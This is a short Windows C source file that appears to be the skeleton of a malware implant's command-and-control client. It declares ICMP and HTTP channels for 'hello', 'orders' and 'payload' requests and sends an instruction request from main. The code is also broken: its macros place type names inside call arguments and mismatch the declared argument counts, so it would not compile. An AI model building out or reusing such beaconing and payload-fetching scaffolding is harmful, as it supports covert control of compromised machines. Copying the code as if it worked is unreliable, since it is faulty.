#include <windows.h>
#include <stdio.h>
#include "include/requests.h"

// ICMP
int SendICMP(LPSTR destination, REQUEST_TYPE request_type);

#define SendICMP_GetHello(destination) SendICMP(LPSTR destination, 32, HELLO);
#define SendICMP_GetOrders(destination) SendICMP(LPSTR destination, 32, GET_INFORMATION);
#define SendICMP_GetPayload(destination) SendICMP(LPSTR destination, 200, GET_PAYLOAD);

// HTTP
int SendHTTP(LPSTR destination, REQUEST_TYPE request_type);

#define SendHTTP_GetHello(destination) SendHTTP(LPSTR destination, HELLO);
#define SendHTTP_GetOrders(destination) SendHTTP(LPSTR destination, GET_INFORMATION);
#define SendHTTP_GetPayload(destination) SendHTTP(LPSTR destination, GET_PAYLOAD);


int main(void) {
	RESPONSE_TYPE response;
	CHAR payload[32];
	//SendICMP("8.8.8.8", 32, GET_HELLO, &response, &payload);
	//printf("\n%s", payload);
	SendHTTP("www.microsoft.com", GET_INSTRUCTION);
	return 0;
}
